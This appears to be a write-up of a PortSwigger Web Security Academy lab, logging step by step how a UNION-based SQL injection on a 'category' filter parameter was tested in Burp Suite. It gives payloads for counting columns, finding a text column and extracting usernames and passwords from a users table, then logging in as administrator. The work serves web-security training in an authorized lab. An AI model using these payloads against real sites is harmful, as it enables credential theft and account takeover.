# Burp Suite Testing Log

## Target Parameter

```text
category
```

## Tool

```text
Burp Suite Professional
```

## Testing Method

```text
Proxy → Intercept → Send to Repeater → Modify Request → Send → Analyze Response
```

---

## Test 01 — Original Request

```http
GET /filter?category=Accessories HTTP/2
```

**Purpose:** Establish the normal application behavior before injection testing.

**Result:** Normal product category response.

---

## Test 02 — Column Count

```sql
' UNION SELECT NULL,NULL--
```

**Purpose:** Determine the number of columns returned by the original query.

**Result:** Successful.

**Finding:**

```text
2 columns
```

---

## Test 03 — First Column Text Test

```sql
' UNION SELECT 'abc',NULL--
```

**Purpose:** Determine whether the first column accepts text.

**Result:** Server-side error.

**Finding:**

```text
First column is not suitable for the tested text value.
```

---

## Test 04 — Second Column Text Test

```sql
' UNION SELECT NULL,'abc'--
```

**Purpose:** Determine whether the second column accepts text.

**Result:** Successful.

**Finding:**

```text
Second column is text-compatible.
```

---

## Test 05 — Multiple Value Extraction

```sql
' UNION SELECT NULL,username||'~'||password FROM users--
```

**Purpose:** Retrieve multiple database values through the single text-compatible column.

**Result:** Successful.

**Observed data:** Multiple user records were returned, including the `administrator` account.

Sensitive password values are intentionally excluded from this documentation.

---

## Test 06 — Authentication Verification

The extracted administrator credentials were submitted through the application's login functionality.

**Result:**

```text
Authentication successful
User: administrator
```

---

## Test 07 — Lab Verification

The PortSwigger Web Security Academy lab displayed:

```text
LAB — Solved
```

**Final Result:**

```text
SQL Injection → UNION Attack → Data Extraction → Administrator Authentication → Solved
```

---

## Evidence Mapping

| Test                    | Evidence                                       |
| ----------------------- | ---------------------------------------------- |
| Original Request        | `../screenshots/02-original-request.png`       |
| Column Count            | `../screenshots/03-column-count.png`           |
| Text-Compatible Column  | `../screenshots/04-text-compatible-column.png` |
| Credential Extraction   | `../screenshots/05-credential-extraction.png`  |
| Successful Exploitation | `../screenshots/06-lab-solved.png`             |

---

## Authorization

All testing was performed against the intentionally vulnerable PortSwigger Web Security Academy laboratory environment.

No unauthorized systems were targeted.
